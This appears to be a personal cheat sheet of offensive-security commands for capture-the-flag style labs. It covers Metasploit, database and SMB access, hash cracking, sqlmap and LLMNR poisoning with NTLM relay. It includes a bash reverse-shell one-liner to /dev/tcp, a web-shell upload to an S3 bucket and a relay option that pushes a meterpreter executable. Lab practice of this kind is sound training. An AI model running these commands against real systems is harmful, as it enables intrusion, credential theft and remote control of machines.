# Tools
Helpful resources
 - https://gowthams.gitbook.io/bughunter-handbook/  (quick reference)
 - https://exploit-notes.hdks.org (quick reference) 
 - https://portswigger.net/web-security/dashboard
 - https://cloud.hacktricks.xyz/welcome/readme
 - https://gtfobins.github.io/gtfobins/vi/#sudo
### Metasploit
 - use `exploit/...`
 - `show options`
 - `run`
 - After u r in a shell, u can put it in background using `background`.
 - Upgrade most recently opened session `sessions -u -1`.


### ZAP
 - `Tools -> Spider`
 - `Analyze -> Scan Policy Manager` remove the things u do not want to scan for, like if no DB, why SQL scanning?
 - see https://tryhackme.com/room/dastzap for authenticated scan details.

### Redis
 - `sudo apt install redis-tools`
 - `redis-cli -h {target_IP}`
 - `info`
 - `select 0` select db with index number.
 - `keys *`, list keys.
 - `get <key>`.

### xfreerdp
 - `xfreerdp /u:administrator  /v:10.129.1.13` try to connect without password.

### gobuster
 - `gobuster dir -u 10.129.145.11 -w ~/SecLists/Discovery/Web-Content/common.txt`

### mongo
 - ./mongo mongodb://{target_IP}:27017
 - help
 - show dbs;
 - use <db_name>;
 - show collections;
 - db.<collection_name>.find().pretty();

### rsync
 - `rsync --list-only 10.129.204.156::` list directories.
 - `rsync --list-only 10.129.204.156::public` list files within directory, here named public.
 - `rsync {target_IP}::public/flag.txt flag.txt` bring remote flag.txt in my machine.

### Mysql
 - `mysql -h <ip> -u root` to login.
 - SHOW databases; : Prints out the databases we can access.
 - USE {database_name}; : Set to use the database named {database_name}.
 - SHOW tables; : Prints out the available tables inside the current database.
 - SELECT * FROM {table_name}; : Prints out all the data from the table {table_name}.

### AWS s3
 - aws --endpoint=http://s3.thetoppers.htb s3 ls
 - aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
 - `aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb` to upload

### SSH tunneling
 - `ssh -L 1234:localhost:5432 christine@{target_IP}` locally we will be listening to 1234

### SMB
 - `smbclient \\\\10.10.10.131\\ADMIN$ -U Administrator` list.
 - `smbclient -L 10.129.27.203 -U administrator`.
 - `python psexec.py username:password@hostIP`.
 -  `psexec.py administrator@10.10.10.131`.

### John
 - `zip2john backup.zip > zip.hashes` dumps hashes to file.
 - `john zip.hashes` cracks the password.

### Hashcat
 - `hashcat -a 0 -m 0 admin_hash.txt /usr/share/wordlists/rockyou.txt` crack md5.
 - `hashcat -m 5600 hash.txt rockyou.txt` crach ntlm.

### nmap
 - `nmap --script=smb2-security-mode.nse -p445 <network>/24` find devices with smb signing disabled.

### sqlmap
 - `sqlmap -u "http://10.129.29.21/dashboard.php?search=%27" --cookie="PHPSESSID=f0mn05nbrdadh5164gavl9q4un"`

### Responder
 - `sudo ./test/bin/python Responder.py -I vboxnet0 -rdwv` listen and respond for LLMNR poisioning.
 - `impacket-ntlmrelayx -tf targets.txt -smb2support` pass the hash, targets.txt has victims ip, `-i` to get interactive smb shell, `-e meterpreter.exe`.

### bash
 - `bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"`, reverse shell.
 - `sudo -l` check sudo permissions.
